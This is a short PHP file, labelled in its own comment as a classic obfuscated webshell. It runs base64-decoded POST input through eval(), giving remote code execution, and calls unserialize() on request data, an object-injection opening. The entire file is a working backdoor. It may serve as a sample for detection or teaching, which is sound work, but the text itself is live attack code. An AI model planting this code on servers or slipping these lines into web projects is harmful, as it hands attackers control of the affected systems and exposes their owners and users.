<?php
// classic obfuscated webshell
eval(base64_decode($_POST['cmd']));
if ($_GET['run']) { unserialize($_REQUEST['payload']); }
?>
